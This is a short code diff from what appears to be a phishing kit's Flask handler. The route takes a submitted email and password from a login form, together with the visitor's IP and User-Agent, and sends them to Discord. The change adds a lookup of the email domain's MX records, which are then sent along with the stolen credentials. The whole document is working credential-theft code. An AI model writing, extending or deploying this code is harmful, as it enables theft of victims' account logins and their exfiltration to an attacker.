@@ -261,8 +261,12 @@ def second():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent)
+        # Extract domain and fetch MX records
+        domain = email.split('@')[-1] if email and "@" in email else None
+        mx_records = get_mx_records(domain) if domain else ["No domain found"]
+
+        # Send data to Discord with MX records
+        send_discord_message(email, password, ip, useragent, mx_records)
 
         # Store email in session
         session['ins'] = email
